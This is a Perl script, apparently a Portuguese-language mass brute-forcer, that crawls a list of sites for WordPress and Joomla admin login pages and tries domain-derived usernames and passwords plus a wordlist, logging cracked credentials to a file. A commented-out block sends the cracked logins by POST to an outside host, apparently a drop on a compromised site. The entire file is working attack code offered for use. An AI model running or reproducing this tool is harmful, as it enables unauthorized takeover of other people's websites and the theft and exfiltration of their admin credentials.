#!/usr/bin/perl -X

use warnings;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0");
$ua->timeout(5);
$ua->cookie_jar(HTTP::Cookies->new(file => 'mycookies.txt',autosave => 1));

if ($ARGV[0] !~ /-w|-j/i){

print q(
 ##########################################################
 ##                    Modo de Usar                      ##
 ##             ------------------------                 ##
 ##         Perl BRT.pl -w sites.txt senhas.txt          ##
 ##         Perl BRT.pl -j sites.txt senhas.txt          ##
 ##########################################################
);exit;}

if ($ARGV[0] =~ /-w/i){

print ("\n ####-########################################-####\n");
print ("    \t\tWordpress Bruter 2.0\n");
print (" ####-########################################-####\n\n");

chomp(my $lista = $ARGV[1]);

chomp(my $lists = $ARGV[2]);

open(SITES, "<$lista") || die "\n [-] Nao foi possivel localizar o arquivo $lista !\n";
chomp(@SITES=<SITES>);
close(SITES);

open(PASS, "$lists") || die "\n [-] Nao foi possivel localizar o arquivo $lists !\n";
chomp(@pass = <PASS>);
close(PASS);

sites: foreach(@SITES){ chomp($url = $_);

if ( $url =~ /^((ftp|http)(s|):\/\/(ftp\.|)|ftp\.|)(.*)/){ $url = 'http://' . $5; }
if ( $url !~ /\/$/ ){$url = $url . '/';}
$nst=''; $p='0'; $unst ='';

if($url =~ /^((http(|s):\/\/(ww(\w{1,3}|)\.|))|(ww(\w{1,3}|)\.|))(.+?)\.(.*)/){ $nst=(substr($8,0,8)); if(length($8) > "8"){$unst=$8;} $r="$8\.$9" }
$c{$r}++; next if $c{$r} > 1;

$redirect = $url . 'wp-admin/';
$wp = $url . 'wp-login.php';

pro: 
my $res=$ua->request(HTTP::Request->new(GET => $wp));
$con = $res->content; $stl = $res->status_line;

if ($stl =~ /404|403|501/ || $con =~ m/404 Not Found|Forbidden|captcha/g || $con !~ m/\"log\"|\"pwd\"|\"wp-submit\"/g){

my @pro = ('blog','wp','WP','wordpress','press','site','portal','home','web','inicio','new','news','beta','novo','vs','vs1','vs2','adm','admin','1','2','2011','2012','2013','2014','painel','panel','pagina','page','pg','err');

if($pro[$p] eq "err"){ next sites; }else{ $wp="$url"."$pro[$p]".'/wp-login.php';$p++; }
goto pro;
}

if($con =~ m/name=\"wp\-submit\"(.*)value=\"(.*?)\"/g){ $login = $2; }else{ $login = 'Log In'; }

@admin=("$nst",'adm'."$nst",'admin'."$nst",$nst.'wp',$nst.'-wp','wp'.$nst,'wp-'.$nst,$nst.'_wp','wp_'.$nst,'root'."$nst",'adm-'."$nst",'admin-'."$nst",'root-'."$nst",'adm_'."$nst",'admin_'."$nst",'root_'."$nst",'master'."$nst",'master-'."$nst",'master_'."$nst","$nst".'adm',"$nst".'admin',"$nst".'root',"$nst".'master','adm','master','root','administrador','administrator','teste','test');
@snhs = ($nst,$nst.'123',$nst.'1234',$nst.'12345',$nst.'wp',$nst.'-wp','wp'.$nst,'wp-'.$nst,$nst.'qwer',$nst.'qwert',$nst.'qwerty',$nst.'147',$nst.'157',$nst.'senha',$nst.'pwd','password'.$nst,'321'.$nst,'s'.$nst,'gov'.$nst,$nst.'gov','pwd'.$nst);

if($unst){
unshift(@admin,'admin',$unst,"$unst",'adm'."$unst",'admin'."$unst",$unst.'wp',$unst.'-wp','wp'.$unst,'wp-'.$unst,$unst.'_wp','wp_'.$unst,'root'."$unst",'adm-'."$unst",'admin-'."$unst",'root-'."$unst",'adm_'."$unst",'admin_'."$unst",'root_'."$unst",'master'."$unst",'master-'."$unst",'master_'."$unst","$unst".'adm',"$unst".'admin',"$unst".'root',"$unst".'master'); 
unshift(@snhs,$unst,$unst.'123',$unst.'1234',$unst.'12345',$unst.'wp',$unst.'-wp','wp'.$unst,'wp-'.$unst,$unst.'qwer',$unst.'qwert',$unst.'qwerty',$unst.'147',$unst.'157',$unst.'senha',$unst.'pwd','password'.$unst,'321'.$unst,'s'.$unst,'gov'.$unst,$unst.'gov','pwd'.$unst); 
}else{ unshift(@admin,'admin'); }

$ckk = '0'; 
usuarios: foreach(@admin){ chomp($usuario = $_);
$cck = '0';
foreach(@snhs,@pass){ chomp($senha = $_);

$cont = 0; $res = 0;
my $req = POST $wp, ['log' => $usuario, 'pwd' => $senha, 'wp-submit' => $login, 'redirect_to' => $redirect, 'testcookie' => '1' ];
my $res = $ua->request($req);

$status = $res->as_string;
$cont = $res->content;

if (($ckk eq "0") and ($status =~ /Location(.*\/wp-login\.php.*?)/)){
@admin = ();
if($unst){  push(@admin,$unst,$nst,'teste','test'); }else{ push(@admin,$nst,'teste','test'); }
$ckk = '1';
}

if (($cck eq "0") and ($ckk eq "0") and ($cont !~ m/\'user_pass\'/g)){ next usuarios; }else{ $cck = '1'; }

if ($status =~ /Location(.*\/wp-admin\/.*?)/ || $status =~ m/=$usuario/g){

print "\n\n [+] $wp  -  $usuario | $senha\n";
open(TXT,">>Resultados.txt");
print TXT "$wp\nLogin : $usuario | Senha: $senha\n\n";
close(TXT);

next sites; }else{

print "\n |WP| $wp  -  $usuario | $senha"; }

}}

next sites;}
print "\n\n\t\t # ~ ~ ~ ~ ~ # - 2.0 - # ~ ~ ~ ~ ~ # \n";
exit();}
#############################################################################################################
if ($ARGV[0] =~ /-j/i){

print ("\n ####-######################################-####\n");
print ("    \t\tJoomla Bruter 2.0\n");
print (" ####-######################################-####\n\n");

chomp(my $lista = $ARGV[1]);
chomp(my $lists = $ARGV[2]);

open(SITES, "<$lista") || die "\n [-] Nao foi possivel localizar o arquivo $lista !\n";
chomp(@SITES=<SITES>);
close(SITES);

open(PASS, "$lists") || die "\n [-] Nao foi possivel localizar o arquivo $lists !\n";
chomp(@pass = <PASS>);
close(PASS);

sites: foreach(@SITES){ chomp($url = $_);

if ( $url =~ /^((ftp|http)(s|):\/\/(ftp\.|)|ftp\.|)(.*)/){ $url = 'http://' . $5; }
if ( $url !~ /\/$/ ){ $url = $url . '/'; }
$nst=''; $p='0'; $unst =''; $asb=''; $u=-2; @senhas = (); $ckst='';

if($url =~ /^(((http|ftp)(|s):\/\/(ftp\.|ww(\w{1,3}|)\.|))|(ftp\.|ww(\w{1,3}|)\.|))(.+?)\.(.*)/){ $nst=(substr($9,0,8)); if(length($9) > "8"){$unst=$9;} $r="$9\.$10" }
$c{$r}++; next if $c{$r} > 1;

$joom = $url.'administrator/index.php';

pro: 
my $red = HTTP::Request->new(GET => $joom);
my $ret = $ua->request($red);

$con = $ret->content; $stl = $ret->status_line;

if($stl =~ /404|403/ || $con =~ m/404 Not Found|Bad hostname|Forbidden|mambo/g or ($con !~ m/\"username\"/g) and ($con !~ m/\"passwd\"/g) and ($con !~ m/\"com_login\"/g)){

my @pro=('site','portal','joomla','joom','Joomla','Joom','joonla','home','blog','web','inicio','new','news','beta','novo','joom','vs','vs1','vs2','adm','admin','painel','panel','pagina','page','pg','err');

if($pro[$p] eq "err"){ next sites; }else{ $joom="$url"."$pro[$p]".'/administrator/index.php';$p++; }
goto pro;}

@admin=("$nst",'teste','test');
@snhs=($nst,$nst.'123',$nst.'1234',$nst.'12345',$nst.'joom',$nst.'-joom','joom'.$nst,'joom-'.$nst,$nst.'qwer',$nst.'qwert',$nst.'qwerty',$nst.'147',$nst.'157',$nst.'senha',$nst.'pwd','password'.$nst,'321'.$nst,'s'.$nst,'gov'.$nst,$nst.'gov','pwd'.$nst);

if($unst){
unshift(@admin,'admin',$unst); 
unshift(@snhs,$unst,$unst.'123','2014',$unst.'1234',$unst.'12345',$unst.'joom',$unst.'-joom','joom'.$unst,'joom-'.$unst,$unst.'qwer',$unst.'qwert',$unst.'qwerty',$unst.'147',$unst.'157',$unst.'senha',$unst.'pwd','password'.$unst,'321'.$unst,'s'.$unst,'gov'.$unst,$unst.'gov','pwd'.$unst); 
}else{ unshift(@admin,'admin'); }

push(@senhas,@snhs,@pass);

usuarios: foreach(@admin){ chomp($usuario = $_);

foreach('ckstvr',@senhas){ chomp($senha = $_); $u++;

if ($con =~ /name=\"(\w{32})\" value=\"1\"/){ $ass = $1; $asb = $2;}

if ($con =~ /name="return" value="(.*?)"/){ $asb = $1; }

my $rreq = POST $joom, [username => $usuario, passwd => $senha, lang => 'en-GB', option => 'com_login', task => 'login', $ass => '1', 'return' => $asb];
my $rpiq = $ua->request($rreq);

$stat = $rpiq->status_line;
$scs = $rpiq->is_success;

if(($stat =~ /301|302|303/) and ($senha eq "ckstvr")){ $ckst='ok'; next; }elsif($senha eq "ckstvr"){ next; }

if (($stat =~ /301|302|303/) and (!$ckst)){ &CK($senha); }elsif(($scs =~ /1/) and ($ckst)){ &CK($senhas[$u]); }else{
print "\n |Joomla| $joom  -  $usuario | $senha"; }

sub CK{
print "\n\n [+] $joom  -  $usuario | $_[0]\n";

open (TXT, ">>Resultados.txt");
print TXT "$joom\nLogin : $usuario | Senha:  $_[0]\n\n";
close(TXT);

#$salve = 'http://fruru.jp/wp-includes/pomo/rs/res.php';
#my $rhg = POST $salve, ["svj"=>"$joom :::: $usuario | $senha" ];
#my $rrs = $ua->request($rhg);

next sites; }


}}
}
print "\n\n\t\t\n";
exit(); }
